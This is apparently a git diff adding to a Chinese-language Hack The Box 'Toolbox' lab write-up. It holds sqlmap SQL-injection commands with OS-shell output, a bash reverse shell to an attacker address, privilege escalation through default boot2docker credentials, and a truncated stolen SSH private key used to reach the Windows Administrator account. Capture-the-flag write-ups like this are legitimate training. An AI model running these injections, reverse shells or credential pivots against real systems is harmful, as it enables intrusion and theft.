@@ -214,8 +214,171 @@ Table: users
 > Send credentials to Tony Update Printer Drivers
 
 
-sqlmap -r data --batch --dbms=PostgreSQL --force-ssl  --no-cast --threads 4  --file-read "/var/www/admin/info.php"
+# foothold .sql注入
+
+这里如果不指定注入方法，会报：stacked queries SQL injection is not supported(不支持堆叠查询)
+```
+┌──(root㉿kali)-[~/htb/Toolbox]
+└─# sqlmap -r data  --risk=3 --level=3 --batch --force-ssl --os-shell --technique T
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[(]_____ ___ ___  {1.8.2#stable}                                                                                                                                                                                                    
+|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:52:44 /2024-02-20/
+
+[01:52:44] [INFO] parsing HTTP request from 'data'
+[01:52:44] [INFO] resuming back-end DBMS 'postgresql' 
+[01:52:44] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: username=max' AND 1799=(SELECT 1799 FROM PG_SLEEP(5))-- vJpB&password=123456
+---
+[01:52:47] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Debian 10 (buster)
+web application technology: PHP 7.3.14, Apache 2.4.38
+back-end DBMS: PostgreSQL
+[01:52:47] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported
+
+[*] ending @ 01:52:47 /2024-02-20/
+
+```
+
+指定注入技术为堆叠查询：--technique S
+
+```
+sqlmap -r data  --risk=3 --level=3 --batch --force-ssl  --os-shell --technique S 
+```
+
+rev shell
+
+```
+bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'
+```
+
+```
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.236] 51379
+bash: cannot set terminal process group (5330): Inappropriate ioctl for device
+bash: no job control in this shell
+whoami
+postgres
+
+```
+
+flag
+```
+postgres@bc56e3cc55e9:/home/tony$ cd ~
+cd ~
+postgres@bc56e3cc55e9:/var/lib/postgresql$ ls
+ls
+11
+user.txt
+postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
+cat user.txt
+f0183e44378ea9774433e2ca6ac78c6a  flag.txt
+
+```
+
+# 提权
+
+从21端口枚举到的信息知道当前系统处于一个docker环境
+
+根据[这个文档](https://github.com/boot2docker/boot2docker#ssh-into-vm)得知docker的默认密码是：
+
+以及[这篇privilege-escalation-boot2docker](https://rioasmara.com/2021/08/08/privilege-escalation-boot2docker/)
+
+```
+docker / tcuser
+```
 
 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh docker@172.17.0.1
 
-sqlmap -r data --batch --dbms=PostgreSQL --force-ssl  --no-cast --threads 4   --file-write "/root/htb/Toolbox/shell.php"  --file-dest "/var/www/shell.php"
+进入C盘拿到ssh的秘钥
+```
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
+ssh docker@172.17.0.1
+docker@172.17.0.1's password: tcuser
+
+   ( '>')
+  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
+ (/-_--_-\)           www.tinycorelinux.net
+
+docker@box:~$ sudo su
+sudo su
+root@box:/home/docker# cd /root
+cd /root
+root@box:~# ls                                                                 
+ls
+root@box:~# cd /                                                               
+cd /
+root@box:/# ls                                                                 
+ls
+bin           home          linuxrc       root          sys
+c             init          mnt           run           tmp
+dev           lib           opt           sbin          usr
+etc           lib64         proc          squashfs.tgz  var
+root@box:/# cd /c/                                                             
+cd /c/
+root@box:/c# ls                                                                
+ls
+Users
+root@box:/c# cd users                                                          
+cd users
+bash: cd: users: No such file or directory
+root@box:/c# cd Users                                                          
+cd Users
+root@box:/c/Users# ls                                                          
+ls
+Administrator  Default        Public         desktop.ini
+All Users      Default User   Tony
+root@box:/c/Users# cd Administrator                                            
+cd Administrator
+root@box:/c/Users/Administrator/.ssh# cat id_rsa                               
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvo4S...lznDJWh/PNqF5I
+-----END RSA PRIVATE KEY-----
+
+```
+
+ssh连接后拿到flag
+```
+┌──(root㉿kali)-[~/htb/Toolbox]
+└─# ssh Administrator@10.10.10.236 -i id_rsa 
+The authenticity of host '10.10.10.236 (10.10.10.236)' can't be established.
+ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.236' (ED25519) to the list of known hosts.
+Microsoft Windows [Version 10.0.17763.1039]          
+(c) 2018 Microsoft Corporation. All rights reserved. 
+                                                     
+administrator@TOOLBOX C:\Users\Administrator>cd Desktop 
+
+administrator@TOOLBOX C:\Users\Administrator\Desktop>dir 
+ Volume in drive C has no label.                      
+ Volume Serial Number is 64F8-B588                    
+                                                      
+ Directory of C:\Users\Administrator\Desktop          
+                                                      
+02/08/2021  11:39 AM    <DIR>          .              
+02/08/2021  11:39 AM    <DIR>          ..             
+02/08/2021  11:39 AM                35 root.txt       
+               1 File(s)             35 bytes         
+               2 Dir(s)   5,468,209,152 bytes free    
+                                                      
+administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt 
+cc9a0b76ac17f8f475250738b96261b3    
+```
